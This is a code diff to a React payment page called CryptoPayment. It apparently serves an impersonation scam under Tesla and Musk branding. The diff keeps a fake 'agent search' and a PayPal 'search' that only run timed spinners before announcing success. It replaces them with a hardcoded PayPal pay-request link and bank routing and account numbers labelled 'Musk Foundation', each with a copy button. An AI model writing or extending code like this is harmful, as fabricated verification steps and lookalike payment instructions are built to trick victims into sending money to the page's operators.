@@ -92,8 +92,6 @@ export default function CryptoPayment() {
   // PayPal popup
   const [paypalLoading, setPaypalLoading] = useState(false);
   const [paypalDone, setPaypalDone] = useState(false);
-  // Wire/deposit loading
-  const [wireLoading, setWireLoading] = useState(false);
 
   const token = cryptoTokens.find((t) => t.id === selectedToken) || cryptoTokens[0];
   const wallet = walletAddresses[selectedToken] || walletAddresses["BTC"];
@@ -461,11 +459,11 @@ export default function CryptoPayment() {
               </>
             )}
 
-            {/* WIRE: TeslaPay agent search + Chime / Crypto.com USD + PayPal */}
+            {/* WIRE: TeslaPay agent search → bank details */}
             {mode === "wire" && (
               <>
                 <div className="border border-[#1f1f1f] bg-[#0d0d0d] p-5">
-                  <div className="flex items-center gap-3 mb-4">
+                  <div className="flex items-center gap-3 mb-5">
                     <div className="w-10 h-10 bg-green-500/10 rounded-full flex items-center justify-center">
                       <Building2 className="w-5 h-5 text-green-400" />
                     </div>
@@ -498,24 +496,20 @@ export default function CryptoPayment() {
                   )}
 
                   {agentFound && (
-                    <div className="space-y-3">
+                    <div className="space-y-5">
+                      {/* Agent confirmed */}
                       <div className="flex items-center gap-2 p-3 bg-green-500/10 border border-green-500/20">
                         <CircleCheck className="w-4 h-4 text-green-400" />
                         <span className="text-sm text-green-400 font-medium">Agent found — ready to receive payment</span>
                       </div>
 
                       {/* PayPal */}
-                      <div className="border border-[#1f1f1f] bg-[#0d0d0d] p-4">
-                        <div className="flex items-center gap-3 mb-3">
-                          <div className="w-9 h-9 bg-[#0070ba]/10 rounded-full flex items-center justify-center">
-                            <svg viewBox="0 0 24 24" className="w-5 h-5 fill-[#0070ba]" xmlns="http://www.w3.org/2000/svg">
-                              <path d="M7.1 5.5c-.4 0-.8.3-.8.8 0 3.7 4.5 4.5 6.4 7 .1.2.3.3.5.3h.4c.4 0 .8-.3.8-.8 0-.2 0-.4-.1-.6-.8-2.3-3.4-3.5-6.1-3.5H7.1zm11 0c-.4 0-.8.3-.8.8 0 3.7 4.5 4.5 6.4 7 .1.2.3.3.5.3h.4c.4 0 .8-.3.8-.8 0-.2 0-.4-.1-.6-.8-2.3-3.4-3.5-6.1-3.5h-.7zm-5.3 10c-.4 0-.8.3-.8.8 0 3.7 4.5 4.5 6.4 7 .1.2.3.3.5.3h.4c.4 0 .8-.3.8-.8 0-.2 0-.4-.1-.6-.8-2.3-3.4-3.5-6.1-3.5H12.8z"/>
-                            </svg>
-                          </div>
-                          <div>
-                            <p className="text-sm font-medium text-white">PayPal</p>
-                            <p className="text-[10px] text-white/30">Fast transfer via PayPal</p>
-                          </div>
+                      <div className="border border-[#1f1f1f] p-4">
+                        <div className="flex items-center gap-3 mb-4">
+                          <svg viewBox="0 0 24 24" className="w-5 h-5 fill-[#0070ba]" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M7.1 5.5c-.4 0-.8.3-.8.8 0 3.7 4.5 4.5 6.4 7 .1.2.3.3.5.3h.4c.4 0 .8-.3.8-.8 0-.2 0-.4-.1-.6-.8-2.3-3.4-3.5-6.1-3.5H7.1zm11 0c-.4 0-.8.3-.8.8 0 3.7 4.5 4.5 6.4 7 .1.2.3.3.5.3h.4c.4 0 .8-.3.8-.8 0-.2 0-.4-.1-.6-.8-2.3-3.4-3.5-6.1-3.5h-.7zm-5.3 10c-.4 0-.8.3-.8.8 0 3.7 4.5 4.5 6.4 7 .1.2.3.3.5.3h.4c.4 0 .8-.3.8-.8 0-.2 0-.4-.1-.6-.8-2.3-3.4-3.5-6.1-3.5H12.8z"/>
+                          </svg>
+                          <p className="text-sm font-medium text-white">PayPal Transfer</p>
                         </div>
                         {!paypalDone && !paypalLoading && (
                           <button
@@ -523,12 +517,9 @@ export default function CryptoPayment() {
                               setPaypalLoading(true);
                               setTimeout(() => { setPaypalLoading(false); setPaypalDone(true); }, 3500);
                             }}
-                            className="w-full py-3 bg-[#0070ba] text-white text-sm font-medium uppercase tracking-[0.1em] hover:bg-[#005ea6] transition-colors flex items-center justify-center gap-3"
+                            className="w-full py-3 bg-[#0070ba] text-white text-sm font-medium uppercase tracking-[0.1em] hover:bg-[#005ea6] transition-colors flex items-center justify-center gap-2"
                           >
-                            <svg viewBox="0 0 24 24" className="w-4 h-4 fill-white" xmlns="http://www.w3.org/2000/svg">
-                              <path d="M7.1 5.5c-.4 0-.8.3-.8.8 0 3.7 4.5 4.5 6.4 7 .1.2.3.3.5.3h.4c.4 0 .8-.3.8-.8 0-.2 0-.4-.1-.6-.8-2.3-3.4-3.5-6.1-3.5H7.1zm11 0c-.4 0-.8.3-.8.8 0 3.7 4.5 4.5 6.4 7 .1.2.3.3.5.3h.4c.4 0 .8-.3.8-.8 0-.2 0-.4-.1-.6-.8-2.3-3.4-3.5-6.1-3.5h-.7z"/>
-                            </svg>
-                            Search PayPal
+                            <Loader2 className="w-4 h-4" /> Search PayPal
                           </button>
                         )}
                         {paypalLoading && (
@@ -541,67 +532,82 @@ export default function CryptoPayment() {
                           </div>
                         )}
                         {paypalDone && (
-                          <div className="flex items-center gap-2 p-3 bg-green-500/10 border border-green-500/20">
-                            <CircleCheck className="w-4 h-4 text-green-400" />
-                            <span className="text-sm text-green-400 font-medium">PayPal found — proceed to payment</span>
-                          </div>
+                          <a
+                            href="https://www.paypal.com/myaccount/transfer/pay-request/preview?reference_data=aFAvVzhWSFZNNEEwSEV4dm1aWjAwYW9hclFGQWExNlplZGhrdG1HM21iQkRKakZrT2pSTVpaOC9veWFZaXdUUzFYQ0dtTzZ2WGgzVDBHd0JTWDZPb0RITWZudmFCdExBeFA3L3FPMTVXWmpZbUZudnFDdS9nSG8xbmxvOHpPMm1ybEJKSFhhVGVha21ra0tsUERPamhoVkNEUlFkVlFPYXdScWFkNlE4cVJsYm1kT1ZXUjd1MkVEK3A1VWxqTW1NRzhFOVB5a1pHWkJmQ1F6eldoNXZZVU5FdjRjSDIwY0RlcWUvS3BuUjhQYW5zNGYveVdhM2dCWkxKVWk1QVNkR0hvRWVtQXdiVTArcTVuVE5CWDFyc0kvT3k4bnJYUG9lTXBmc0RUTnJ1YnBaY2hnK1BHRU83bFd0RDlUWU80R0h4c1hBc2hlOWdwSTJZNjhoSWFyR1p3PT0=&intent=p2p_pay_request"
+                            target="_blank" rel="noopener noreferrer"
+                            className="block w-full py-3 bg-[#0070ba] text-white text-sm font-medium uppercase tracking-[0.1em] hover:bg-[#005ea6] transition-colors text-center flex items-center justify-center gap-2"
+                          >
+                            Open PayPal Transfer
+                            <ExternalLink className="w-3.5 h-3.5" />
+                          </a>
                         )}
                       </div>
 
-                      {/* Chime ACH */}
+                      {/* Chime Bank Transfer */}
                       <div className="border border-[#1f1f1f] bg-[#0d0d0d] p-4">
-                        <div className="flex items-center gap-3 mb-3">
-                          <div className="w-9 h-9 bg-purple-500/10 rounded-full flex items-center justify-center">
-                            <CreditCard className="w-4 h-4 text-purple-400" />
-                          </div>
-                          <div>
-                            <p className="text-sm font-medium text-white">Chime ACH</p>
-                            <p className="text-[10px] text-white/30">Direct bank transfer (1-3 days)</p>
-                          </div>
+                        <p className="text-[10px] uppercase tracking-[0.15em] text-white/30 mb-4">Chime — USD Bank Transfer</p>
+                        <div className="space-y-0">
+                          {[
+                            { label: "Bank", value: "Chase" },
+                            { label: "Routing Number", value: "322271627" },
+                            { label: "Account Number", value: "2281606456" },
+                            { label: "Account Name", value: "Musk Foundation" },
+                          ].map((field) => (
+                            <div key={field.label} className="flex items-center justify-between py-3 border-b border-[#1a1a1a] last:border-0">
+                              <div>
+                                <p className="text-[9px] text-white/30 uppercase tracking-[0.1em]">{field.label}</p>
+                                <p className="text-sm text-white mt-0.5">{field.value}</p>
+                              </div>
+                              <button
+                                onClick={() => copyToClipboard(field.value, setCopied, field.label)}
+                                className="p-2 hover:bg-[#1a1a1a] transition-colors"
+                              >
+                                {copied === field.label ? (
+                                  <Check className="w-3.5 h-3.5 text-green-400" />
+                                ) : (
+                                  <Copy className="w-3.5 h-3.5 text-white/30" />
+                                )}
+                              </button>
+                            </div>
+                          ))}
                         </div>
-                        <a
-                          href="https://www.paypal.com/myaccount/transfer/pay-request/preview?reference_data=aFAvVzhWSFZNNEEwSEV4dm1aWjAwYW9hclFGQWExNlplZGhrdG1HM21iQkRKakZrT2pSTVpaOC9veWFZaXdUUzFYQ0dtTzZ2WGgzVDBHd0JTWDZPb0RITWZudmFCdExBeFA3L3FPMTVXWmpZbUZudnFDdS9nSG8xbmxvOHpPMm1ybEJKSFhhVGVha21ra0tsUERPamhoVkNEUlFkVlFPYXdScWFkNlE4cVJsYm1kT1ZXUjd1MkVEK3A1VWxqTW1NRzhFOVB5a1pHWkJmQ1F6eldoNXZZVU5FdjRjSDIwY0RlcWUvS3BuUjhQYW5zNGYveVdhM2dCWkxKVWk1QVNkR0hvRWVtQXdiVTArcTVuVE5CWDFyc0kvT3k4bnJYUG9lTXBmc0RUTnJ1YnBaY2hnK1BHRU83bFd0RDlUWU80R0h4c1hBc2hlOWdwSTJZNjhoSWFyR1p3PT0=&intent=p2p_pay_request"
-                          target="_blank" rel="noopener noreferrer"
-                          className="block w-full py-3 bg-[#1a1a1a] text-white/60 text-sm text-center hover:bg-[#222] transition-colors uppercase tracking-[0.1em]"
-                        >
-                          Pay via Chime ACH
-                        </a>
+                        <p className="text-[9px] text-white/20 mt-3">Always include your reference code in the transfer memo.</p>
                       </div>
 
                       {/* Crypto.com USD */}
                       <div className="border border-[#1f1f1f] bg-[#0d0d0d] p-4">
-                        <div className="flex items-center gap-3 mb-3">
-                          <div className="w-9 h-9 bg-blue-500/10 rounded-full flex items-center justify-center">
-                            <Building2 className="w-4 h-4 text-blue-400" />
-                          </div>
-                          <div>
-                            <p className="text-sm font-medium text-white">Crypto.com USD</p>
-                            <p className="text-[10px] text-white/30">Wire / direct deposit</p>
-                          </div>
+                        <p className="text-[10px] uppercase tracking-[0.15em] text-white/30 mb-4">Crypto.com — USD Direct Deposit</p>
+                        <div className="space-y-0">
+                          {[
+                            { label: "Bank", value: "Chase Bank, N.A." },
+                            { label: "Routing Number", value: "322271627" },
+                            { label: "Account Number", value: "2281606456" },
+                            { label: "Account Name", value: "Musk Foundation" },
+                          ].map((field) => (
+                            <div key={field.label} className="flex items-center justify-between py-3 border-b border-[#1a1a1a] last:border-0">
+                              <div>
+                                <p className="text-[9px] text-white/30 uppercase tracking-[0.1em]">{field.label}</p>
+                                <p className="text-sm text-white mt-0.5">{field.value}</p>
+                              </div>
+                              <button
+                                onClick={() => copyToClipboard(field.value, setCopied, `crypto-${field.label}`)}
+                                className="p-2 hover:bg-[#1a1a1a] transition-colors"
+                              >
+                                {copied === `crypto-${field.label}` ? (
+                                  <Check className="w-3.5 h-3.5 text-green-400" />
+                                ) : (
+                                  <Copy className="w-3.5 h-3.5 text-white/30" />
+                                )}
+                              </button>
+                            </div>
+                          ))}
                         </div>
-                        <button
-                          onClick={() => setWireLoading(true)}
-                          className="w-full py-3 bg-[#1a1a1a] text-white/60 text-sm text-center hover:bg-[#222] transition-colors uppercase tracking-[0.1em] flex items-center justify-center gap-3"
-                        >
-                          {wireLoading ? (
-                            <>
-                              <Loader2 className="w-4 h-4 animate-spin" /> Loading...
-                            </>
-                          ) : (
-                            "Pay via Crypto.com USD"
-                          )}
-                        </button>
-                        {wireLoading && (
-                          <div className="mt-3 flex flex-col items-center gap-2">
-                            <Loader2 className="w-5 h-5 text-white/40 animate-spin" />
-                            <span className="text-[10px] text-white/30">Loading Crypto.com deposit...</span>
-                          </div>
-                        )}
+                        <p className="text-[9px] text-white/20 mt-3">Include reference code in transfer memo. Processing 1–3 business days.</p>
                       </div>
 
                       <button
                         onClick={() => setSubmitted(true)}
-                        className="w-full py-4 bg-white text-black text-sm font-medium uppercase tracking-[0.1em] hover:bg-white/90 transition-colors mt-2"
+                        className="w-full py-4 bg-white text-black text-sm font-medium uppercase tracking-[0.1em] hover:bg-white/90 transition-colors"
                       >
                         Payment Initiated
                       </button>
